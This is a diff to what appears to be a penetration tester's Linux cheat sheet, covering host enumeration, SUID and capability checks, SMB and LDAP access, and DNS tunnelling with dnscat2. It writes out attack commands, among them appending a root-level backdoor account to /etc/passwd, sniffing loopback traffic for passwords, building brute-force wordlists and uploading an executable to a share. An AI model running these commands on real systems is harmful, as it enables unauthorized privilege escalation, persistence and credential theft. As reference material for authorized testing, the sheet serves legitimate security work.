@@ -1,6 +1,102 @@
-Automatic enumeration can be done with LinPEAS (https://github.com/carlospolop/PEASS-ng)
+#Automatic enumeration can be done with LinPEAS (https://github.com/carlospolop/PEASS-ng)
+
+#Too lazy to enumerate manually, try unix-privesc-check
+https://github.com/pentestmonkey/unix-privesc-check
+
+#Can't remember how to leverage what? Check gtfobins:
+https://gtfobins.github.io/
 
 ----
+
+#Version info
+cat /etc/issue
+cat /etc/os-release
+uname -a
+uname -r
+arch
+
+#Network connections
+netstat -tulpn
+ss -tulpn
+
+#Resolvers
+cat /etc/resolv.conf
+resolvectl status
+
+#Users and in some case passwords can be found in /etc/passwd, which can be exploited if for some reason you have writes to this file
+#/etc/passwd passwords precede /etc/shadow ones
+openssl passwd assword
+fFXEX2n561kQ2
+echo "root666:fFXEX2n561kQ2:0:0:root:/root:/bin/bash" >> /etc/passwd
+
+#FW rules are might be saved locally
+cat /etc/iptables/rules.v2
+
+#Scheduled tasks
+ls -lah /etc/cron*
+crontab -l
+sudo crontab -l
+grep "CRON" /var/log/syslog
+
+#Installed apps
+dpkg -l
+apt list
+rpm -a
+
+#Find writable folders
+find / -type d -writable 2>/dev/null
+
+#List files with SUID bit set
+find / -perm -u=s -type f 2>/dev/null
+
+#Show sudoer powers
+sudo -l
+
+#Find binaries with setuid enabled, also need +ep flag to abuse (cap_setuid+ep)
+/usr/sbin/getcap -r / 2>/dev/null
+
+#List mounted/unmounted filesystems
+cat /etc/fstab
+mount
+
+#List available disks
+lsblk
+
+#List modules
+lsmod
+
+#Show module details
+/sbin/modinfo modulename
+
+#Show environment variables
+env
+
+#Create a passwordlist for bruteforcing: the list indices start with four digits and then the string "foo", all combinations are then automatically created
+#Min and max length both set to 7 characters
+crunch 7 7 -t %%%%foo > wordlist
+
+#run ps aux every 2 seconds and grep the results for something
+watch -n 2 "ps -aux | grep something"
+
+#Grep TCP traffic on loopback for the string "password" (requires sudo rights)
+sudo tcpdump -i lo  -A | grep "password"
+
+#Check app-armor status (requires root)
+aa-status
+
+--
+
+#Check SMB shares
+xdg-open smb://lab.local
+
+#Connect SMB, once if succesfully connected you can "get", "ls" etc. commands
+smbclient -p 445 -L //10.10.10.1/ -U admin --password=r00t
+
+#Put a file to a share:
+smbclient //dc.testad.local/share -c 'put definitely_not_malicious.exe' -U admin -P admin
+
+#Dump all available info from LDAP for example to process with Bloodhound
+ldapsearch -x -H ldap://10.10.20.1 -b 'dc=testad,dc=local' -D 'cn=someuser,ou=users,dc=testad,dc=local' -W -z 9999999 > ldap_dump.ldif
 
 ##Quick spawn a "web server"
 python3 -m http.server 1234
@@ -137,96 +233,8 @@ ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' user
 
 #Using dnscat2 (requires you to have your own domain and run the authoritative ns yourself) https://github.com/iagox86/dnscat2
 dnscat2-server yourdomain.tld
-#Leveragin listen
 #Local post forward listening on 4444 loopback and forwarding to 10.0.20.1 port 445
 window -i 1 (first check with "windows" how many you already have, by default there's only window 0)
 listen 127.0.0.1:4444 172.16.2.11:445
 #Make for example and SMB request through dnscat running listen on 4444
 smbclient -p 4444 -L //127.0.0.1 -U user --password=passw
-
-----
-
-#Version info
-cat /etc/issue
-cat /etc/os-release
-uname -a
-uname -r
-arch
-
-#Network connections
-netstat -tulpn
-ss -tulpn
-
-#Resolvers
-cat /etc/resolv.conf
-resolvectl status
-
-#Users and in some case passwords can be found in /etc/passwd, which can be exploited if for some reason you have writes to this file
-#/etc/passwd passwords precede /etc/shadow ones
-openssl passwd assword
-fFXEX2n561kQ2
-echo "root666:fFXEX2n561kQ2:0:0:root:/root:/bin/bash" >> /etc/passwd
-
-#FW rules are might be saved locally
-cat /etc/iptables/rules.v2
-
-#Scheduled tasks
-ls -lah /etc/cron*
-crontab -l
-sudo crontab -l
-grep "CRON" /var/log/syslog
-
-#Installed apps
-dpkg -l
-apt list
-rpm -a
-
-#Find writable folders
-find / -type d -writable 2>/dev/null
-
-#List files with SUID bit set
-find / -perm -u=s -type f 2>/dev/null
-
-#Show sudoer powers
-sudo -l
-
-#Find binaries with setuid enabled, also need +ep flag to abuse (cap_setuid+ep)
-/usr/sbin/getcap -r / 2>/dev/null
-
-#List mounted/unmounted filesystems
-cat /etc/fstab
-mount
-
-#List available disks
-lsblk
-
-#List modules
-lsmod
-
-#Show module details
-/sbin/modinfo modulename
-
-#Show environment variables
-env
-
-#Create a passwordlist for bruteforcing: the list indices start with four digits and then the string "foo", all combinations are then automatically created
-#Min and max length both set to 7 characters
-crunch 7 7 -t %%%%foo > wordlist
-
-#run ps aux every 2 seconds and grep the results for something
-watch -n 2 "ps -aux | grep something"
-
-#Grep TCP traffic on loopback for the string "password" (requires sudo rights)
-sudo tcpdump -i lo  -A | grep "password"
-
-#Check app-armor status (requires root)
-aa-status
-
-#Connect SMB, once if succesfully connected you can "get", "ls" etc. commands
-smbclient -p 445 -L //10.10.10.1/ -U admin --password=r00t
-
-#Too lazy to enumerate manually, try unix-privesc-check
-https://github.com/pentestmonkey/unix-privesc-check
-
-#Can't remember how to leverage what? Check gtfobins:
-https://gtfobins.github.io/
